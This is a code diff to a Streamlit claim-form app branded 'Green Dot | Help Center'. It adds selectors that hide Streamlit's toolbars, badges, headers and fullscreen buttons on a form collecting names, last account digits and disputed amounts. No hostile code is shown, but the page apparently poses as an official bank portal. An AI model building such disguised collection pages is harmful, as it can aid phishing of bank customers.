@@ -23,13 +23,16 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# 1. JS: LIMPIEZA DE INTERFAZ QUIRÚRGICA
+# 1. JS: LIMPIEZA DE INTERFAZ PROFUNDA
 st.markdown("""<script>
     const cleanDOM = () => {
         const selectors = [
             '.section-anchor', 
             'a.section-anchor', 
             '[data-testid="stHeaderActionElements"]',
+            '[data-testid="stElementToolbar"]',
+            '.stElementToolbar',
+            '.st-emotion-cache-140j12g',
             '.st-emotion-cache-gi0tri', 
             '.etxdrby3',
             '._viewerBadge_aycw8_23', 
@@ -43,11 +46,12 @@ st.markdown("""<script>
     setInterval(cleanDOM, 500);
 </script>""", unsafe_allow_html=True)
 
-# 2. CSS: OCULTAR ANCLAS Y REFUERZO VISUAL
+# 2. CSS: OCULTAR ELEMENTOS RESIDUALES
 st.markdown("""<style>
-/* Ocultar anclas y contenedores de acciones en encabezados */
+/* Bloqueo total de cabeceras, pies de página y toolbars de Streamlit */
 header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor, 
-[data-testid="stHeaderActionElements"], .st-emotion-cache-gi0tri, .etxdrby3 {
+[data-testid="stHeaderActionElements"], [data-testid="stElementToolbar"], 
+.stElementToolbar, .st-emotion-cache-gi0tri, .etxdrby3, .st-emotion-cache-140j12g {
     display: none !important;
     visibility: hidden !important;
     height: 0 !important;
@@ -56,12 +60,13 @@ header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor,
     pointer-events: none !important;
 }
 
-/* Eliminar específicamente el símbolo de link en los encabezados de Markdown */
+/* Eliminar específicamente el símbolo de link en los encabezados */
 .stMarkdown a.section-anchor {
     display: none !important;
 }
 
-button[title='View fullscreen'] {
+/* Ocultar botón fullscreen de forma redundante */
+button[title='View fullscreen'], button[aria-label='Fullscreen'] {
     display: none !important;
 }
 
@@ -120,7 +125,7 @@ with col2:
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
-with st.form("compact_form_v21_6", clear_on_submit=True):
+with st.form("compact_form_v21_7", clear_on_submit=True):
     nombre = st.text_input("Full Name")
     cuenta = st.text_input("Last 4 digits of Account")
     monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
